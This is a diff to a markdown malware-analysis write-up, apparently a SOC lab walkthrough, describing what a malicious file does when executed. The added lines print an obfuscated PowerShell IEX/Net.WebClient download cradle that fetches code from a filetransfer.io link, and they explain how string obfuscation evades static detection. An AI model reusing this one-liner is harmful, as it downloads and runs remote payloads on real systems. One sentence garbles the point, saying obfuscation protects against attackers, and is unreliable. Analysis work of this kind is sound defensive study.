@@ -87,9 +87,15 @@ It also includes the file's history, specifying its creation date, first submiss
 #### Behaviours
 
 This section contains detailed information about the malicious file, including a step-by-step technique devised by the threat actor. It also outlines MITRE ATT&CK Tactics and Techniques, behavior tags, network communications, and more. However, my main focus will be on the effects of executing this file on the system.<br>
-It is believed that the user made a `GET` request to `https://filetransfer.io/`, which redirected to the link `https://filetransfer.io/data-package/UR2whuBv/download`. However, this request was **blocked**. If it had been executed, it could have modified the file system and the file registry by running an unrecognized or potentially malicious process, as seen in the image below from Virustotal. 
+It is believed that either the *user* or a *process* made a `GET` request to `https://filetransfer.io/`, which redirected to the link `https://filetransfer.io/data-package/UR2whuBv/download`. However, this request was **blocked**. If it had been executed, it could have modified the file system and the file registry by running an unrecognized or potentially malicious process, as seen in the image below from Virustotal. 
 
+As shown in Figure 11, running the file establishes a path to PowerShell.exe to execute a NET.WebClient. `````path: \\?\C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, commandline: powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'))).`````<br><br>
 
+The purpose of that was to invoke a malicious link `'https://filetransfer.io/data-package/UR2whuBv/download'` to download the malicious file. <br><br><br>
+
+`(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))`<br>
+
+This section appears to utilize a method referred to as “string obfuscation.” The main objective of employing this technique is to complicate the code and make it less recognizable to static analysis tools. These tools are often used in cybersecurity to scan code for vulnerabilities or malicious patterns, using signature-based detection methods that look for known harmful behaviors or sequences of code. By obscuring the strings within the code, the method aims to prevent these analysis tools from easily identifying the underlying functionality or intentions of the code. This adds a layer of protection against potential attackers who rely on such tools for reconnaissance and exploitation of vulnerabilities. [Enes Adışen](https://medium.com/@zapbroob9/soc137-eventid-76-malicious-file-script-download-attempt-letsdefend-io-277090f3dd4b)
 
 <img width="920" height="428" alt="image" src="https://github.com/user-attachments/assets/8bf4031c-c970-4506-934d-58483480436c" /><br>
 *Fig 10*
